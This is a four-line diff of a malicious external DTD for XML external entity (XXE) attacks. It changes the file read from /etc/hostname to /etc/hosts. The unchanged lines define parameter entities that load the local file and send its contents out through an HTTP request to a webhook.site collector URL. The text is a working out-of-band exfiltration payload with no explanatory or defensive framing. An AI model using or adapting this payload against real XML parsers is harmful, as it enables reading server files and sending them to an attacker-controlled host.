@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % file SYSTEM "file:///etc/hosts">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://webhook.site/8bfafc1f-72d6-45bd-9e49-e405bf785fc5/?d=%file;'>">
 %eval;
 %exfil;
